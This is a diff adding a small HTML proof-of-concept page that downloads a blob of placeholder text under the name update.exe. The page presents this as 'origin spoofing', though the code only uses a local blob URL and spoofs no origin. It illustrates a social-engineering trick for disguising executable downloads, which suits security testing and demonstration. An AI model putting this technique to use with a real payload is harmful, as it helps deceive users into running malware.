@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<title>PoC Spoofing Origin Download</title>
+</head>
+<body>
+<h2>Download File Spoofing Origin</h2>
+<p>Click the button below to download a file named <code>update.exe</code> which pretends to be from a trusted source.</p>
+
+<button id="downloadBtn">Download update.exe</button>
+
+<script>
+document.getElementById('downloadBtn').addEventListener('click', function() {
+    // Create a fake file content
+    const fileContent = "This is a fake update file pretending to be from a trusted source.";
+    const blob = new Blob([fileContent], { type: 'text/plain' });
+
+    // Create a fake URL (simulating different origin)
+    // Note: In real attack, attacker hosts file on malicious domain
+    const url = URL.createObjectURL(blob);
+
+    // Create a temporary link element
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = "update.exe"; // Spoofed file name
+    document.body.appendChild(a);
+    a.click();
+
+    // Cleanup
+    setTimeout(() => {
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+    }, 100);
+});
+</script>
+</body>
+</html>
